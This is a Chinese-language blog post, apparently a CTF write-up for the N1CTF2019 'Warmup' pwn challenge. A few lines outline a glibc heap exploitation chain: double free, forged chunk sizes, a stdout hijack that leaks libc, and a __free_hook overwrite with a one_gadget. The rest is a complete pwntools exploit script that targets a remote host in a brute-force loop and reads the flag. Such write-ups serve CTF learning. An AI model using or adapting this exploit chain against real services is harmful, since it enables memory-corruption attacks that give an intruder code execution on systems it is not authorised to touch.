---
layout: post
title:  "N1CTF2019-Writeup"
date:   2019-9-9
desc: ""
keywords: ""
categories: [Ctf]
tags: [CTF]
icon: icon-html
---

# N1CTF2019-Writeup

* ### Warmup

  利用double free把fake chunk申请到已有chunk下方，覆盖下一个chunk的size，然后edit上一个chunk改fake chunk的size，搞出两个size为0x90的块，一个填tcachebins，满了之后free另一个，进入unsorted bin

  劫持stdout泄露libc(需要爆破一字节)

  然后改free_hook

  ```python
  from pwn import *
  
  #r = process('./warmup')
  elf = ELF('./warmup')
  libc = ELF('./libc-2.27.so')
  #context.log_level = 'debug'
  while True:
  	try:
  		r = remote('47.52.90.3',9999)
  		def add(content):
  			r.sendlineafter('>>','1')
  			r.sendafter('content>>',content)
  
  		def delete(index):
  			r.sendlineafter('>>','2')
  			r.sendafter('index:',str(index))
  
  		def modify(index,content):
  			r.sendlineafter('>>','3')
  			r.sendafter('index:',str(index))
  			r.sendafter('content>>',content)
  
  		add('\x11'*0x40)
  		add('\x22'*0x40)
  		add('\x33'*0x40)
  		add('\x44'*0x40)
  		delete(0)
  		delete(0)
  		delete(0)
  		delete(0)
  		add('\x80')
  		add('\x80')
  		add(p64(0)*7+'\x91')
  
  		modify(0,p64(0)+p64(0x91))
  
  		delete(1)
  		delete(1)
  		delete(1)
  		delete(1)
  		delete(1)
  		delete(5)
  		delete(1)	
  		delete(5)
  		log.info('fuck')
  		modify(0,p64(0)+p64(0x51)+p8(0x60)+'\x37')
  		delete(0)
  		delete(0)
  		delete(0)
  		delete(0)
  		add(p8(0x80))
  		add(p8(0x80))
  		add(p8(0x80))
  		add(p64(0xfbad1800) + p64(0)*3 + "\x00")#stdout
  
  		modify(6,p64(0xfbad1800) + p64(0)*3 + "\x00")
  		r.interactive()
  		fuck = r.recv(30)
  		log.info(fuck)
  		libc_addr =  u64(fuck[8:16])
  
  		log.success(hex(libc_addr))
  		malloc_hook =  0x7ffff7dcfc30-0x7ffff7dd18b0+libc_addr
  		print hex(malloc_hook)
  		libc_base = malloc_hook-libc.symbols['__malloc_hook']
  		one = libc_base+0x4f322
  		free_hook = libc_base+libc.symbols['__free_hook']
  		print hex(one)
  
  		print hex(free_hook)
  
  		delete(0)
  		delete(0)
  		add(p64(free_hook))
  		add(p64(free_hook))
  		add(p64(one))
  		delete(2)
  		r.sendline('cat flag')
  		log.info(r.recv())
  		r.interactive()
  	except:
  		continue
  
  ```

  